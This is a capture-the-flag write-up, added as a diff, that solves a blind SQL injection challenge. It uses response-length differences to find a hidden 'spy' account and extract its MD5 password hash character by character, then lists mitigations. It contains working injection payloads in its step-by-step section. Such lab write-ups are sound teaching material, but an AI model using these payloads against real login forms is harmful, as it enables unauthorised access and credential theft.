@@ -1,0 +1,54 @@
+Challenge: Hidden Agent
+Atish Kadam
+
+
+VULNERABILITY
+
+The login form's password field was vulnerable to Blind SQL Injection. User
+input was plugged directly into the SQL query without any checks. The app's
+response was noticeably shorter when a login condition evaluated to TRUE versus
+FALSE — this size difference acted as a yes/no oracle, letting us ask the
+database questions and read the answers just from how big the response was.
+
+The real target here wasn't the database name — it was finding a hidden user
+(a "spy" account) in the system and extracting their password hash to get
+the flag.
+
+
+APPROACH / SOLUTION
+
+Step 1 — Confirm injection works:
+First, we verified the vulnerability by checking that:
+  ' OR 1=1#   → short response (TRUE)
+  ' OR 1=0#   → long response (FALSE)
+This confirmed blind injection was working.
+
+Step 2 — Find the hidden user:
+We tried a list of common hidden/spy account email names one by one:
+  ' OR email='hidden'#
+  ' OR email='agent'#
+  ' OR email='spy'#
+  ...
+When the response came back short (TRUE), we found the hidden user's email.
+
+Step 3 — Find the length of their password:
+  ' OR (email='<hidden>' AND LENGTH(password)=N)#
+We incremented N until the response turned TRUE, giving us the exact length.
+
+Step 4 — Extract the password character by character:
+  ' OR (email='<hidden>' AND MID(password,1,1)='a')#
+  ' OR (email='<hidden>' AND MID(password,2,1)='b')#
+  ...
+Since passwords were stored as MD5 hashes, only hex characters (a-f, 0-9)
+were needed — making extraction much faster.
+
+Getting the flag:
+  flag = f"cs6903{{{extracted_password}}}"
+
+
+MITIGATION / FIX
+1. Parameterized queries
+2. Normalize responses 
+3. Hash passwords properly 
+4. Restrict DB user permissions 
+5. Rate limiting 
